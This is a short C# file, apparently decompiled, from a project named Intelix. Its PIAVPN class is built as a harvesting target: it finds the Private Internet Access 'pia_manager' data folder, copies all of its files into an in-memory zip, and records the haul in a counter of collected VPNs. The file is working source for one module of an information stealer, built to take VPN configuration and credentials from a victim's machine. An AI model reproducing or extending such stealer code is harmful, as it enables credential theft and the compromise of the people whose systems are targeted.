using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Vpn
{
	// Token: 0x02000010 RID: 16
	public class PIAVPN : ITarget
	{
		// Token: 0x06000033 RID: 51 RVA: 0x000030D0 File Offset: 0x000012D0
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "pia_manager");
			bool flag = Directory.Exists(text);
			if (flag)
			{
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "PIA";
				zip.AddDirectoryFiles(text, "PIAVPN", true);
				counterApplications.Files.Add(text + " => PIAVPN");
				counterApplications.Files.Add("PIAVPN\\");
				counter.Vpns.Add(counterApplications);
			}
		}
	}
}
